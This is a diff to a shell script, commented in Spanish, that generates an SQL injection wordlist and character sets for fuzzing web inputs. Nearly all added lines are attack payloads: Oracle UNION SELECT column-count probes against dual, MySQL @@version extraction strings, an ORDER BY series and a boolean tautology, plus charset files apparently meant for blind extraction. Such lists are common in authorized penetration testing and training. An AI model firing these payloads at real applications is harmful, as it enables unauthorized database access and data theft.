@@ -12,6 +12,33 @@ cat *.txt | sort -u > sqli_wl.txt
 # se añaden payloads de order by
 seq 1 20 | xargs -I{} echo "' ORDER BY {}-- -" >> sqli_wl.txt
 
+# añadimos paylaods de union select para oracle:                           
+echo "' UNION SELECT null from dual-- -" >> sqli_wl.txt 
+echo "' UNION SELECT null,null from dual-- -" >> sqli_wl.txt 
+echo "' UNION SELECT null,null,null from dual-- -" >> sqli_wl.txt 
+echo "' UNION SELECT null,null,null,null from dual-- -" >> sqli_wl.txt 
+echo "' UNION SELECT null,null,null,null,null from dual-- -" >> sqli_wl.txt 
+echo "' UNION SELECT null,null,null,null,null,null from dual-- -" >> sqli_wl.txt 
+echo "' UNION SELECT null,null,null,null,null,null,null from dual-- -" >> sqli_wl.txt 
+echo "' UNION SELECT @@version#" >> sqli_wl.txt 
+echo "' UNION SELECT @@version,null#" >> sqli_wl.txt 
+echo "' UNION SELECT @@version,null,null#" >> sqli_wl.txt 
+echo "' UNION SELECT @@version,null,null,null#" >> sqli_wl.txt 
+echo "' UNION SELECT @@version,null,null,null,null#" >> sqli_wl.txt 
+
+echo "' AND '1'='1" >> sqli_wl.txt
+
+printf '%s\n' {a..z} {A..Z} {0..9} '!' '@' '#' '$' '%' '^' '&' '*' '(' ')' '-' '=' '_' '+' > charset.txt
+
+printf '%s\n' {a..z} {A..Z} {0..9} > charset.txt
+
+# todos los caracteres en ascii
+for i in $(seq 32 126); do printf "\\$(printf '%03o' $i)\n"; done > charset.txt
+
+printf '%s\n' {0..99} > num.txt
+
+
+
 # se añade " " por "+"
 while IFS= read -r line; do
     echo "$line"
